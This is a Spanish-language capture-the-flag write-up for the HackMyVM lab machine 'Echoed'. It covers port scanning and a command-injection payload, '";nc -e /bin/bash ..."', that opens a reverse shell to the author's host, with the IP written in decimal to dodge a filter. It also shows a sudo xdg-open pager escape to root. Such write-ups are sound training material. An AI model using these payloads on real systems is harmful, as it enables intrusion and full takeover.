---
layout: post
title: Echoed - Hackmyvm
tags: [ctf, hackmyvm]
---

**Autor**: Sml \\
**Dificultad**: Medio

![img](/imgs/write-ups/hackmyvm/echoed/echoed.png#center)

## Reconocimiento

Como es costumbre, lo primero es una enumeración de los puertos abiertos.

```
$  sudo nmap -p- 192.168.1.41
[sudo] password for kStarting Nmap 7.93 ( https://nmap.org ) at 2023-04-22 07:04 EDT
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan
ARP Ping Scan Timing: About 100.00% done; ETC: 07:04 (0:00:00 remaining)
Nmap scan report for 192.168.1.41
Host is up (0.000095s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
4444/tcp open  krb524
MAC Address: 08:00:27:40:4F:9C (Oracle VirtualBox virtual NIC)
```

### 80 (http)

En el puerto 80 no hay nada interesante, solo nos dice que hay un prompt en un puerto no común.

```
$ curl 192.168.1.41                                                      
If you dont see Command: prompt in the XXXX port, please restart the VM.
```

## Explotación

### 4444 (Prompt)

Doy por hecho que el prompt está en el puerto 4444 descubierto anteriormente en la enumeración por lo que procedo a conectarme usando **nc**.

```
$ nc 192.168.1.41 4444
Command:test
Found illegal char.Command:a
Executing:echo "a"
a
```

Hay caracteres que si que permite y otros que no. Tras una seríe de comprobaciones consigo una reverse shell utilizando el siguiente comando.

```
Command:";nc -e /bin/bash 3232235862 1234"
```
La ip de mi máquina local está en formato decimal ya que el punto "." es un caracter inválido en el prompt.

## Escalado de privilegios

Tras ejecutar el comando, obtengo la shell como el usuario charlie.

```
$ nc -lvnp 1234       
listening on [any] 1234 ...
connect to [192.168.1.86] from (UNKNOWN) [192.168.1.41] 60916
script -qc /bin/bash /dev/null
charlie@echoed:~$ :)
```

Compruebo sus permisos de sudo y puede ejecutar "/usr/bin/xdg-open" como usuario root.

```
$ sudo -l
sudo -l
Matching Defaults entries for charlie on echoed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charlie may run the following commands on echoed:
    (ALL : ALL) NOPASSWD: /usr/bin/xdg-open
```

Como se puede ver, utiliza el editor (nano/less/vim) por defecto para abrir ficheros de texto y con cualquiera de ellos es sencillo obtener una shell.

![img](/imgs/write-ups/hackmyvm/echoed/echoed_1.png#center)

```
charlie@echoed:/tmp$ cd /tmp
charlie@echoed:/tmp$ echo "test" > test
charlie@echoed:/tmp$ sudo /usr/bin/xdg-open test
sudo /usr/bin/xdg-open test
WARNING: terminal is not fully functional
/tmp/test  (press RETURN)
test
/tmp/test (END)
(END)
(END)
(END)!/bin/bash
!//bbiinn//bbaasshh!/bin/bash
root@echoed:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)
root@echoed:/tmp# :)
```

Y con esto la máquina ya estaría resuelta.

Muchas gracias a **Sml** por esta máquina.
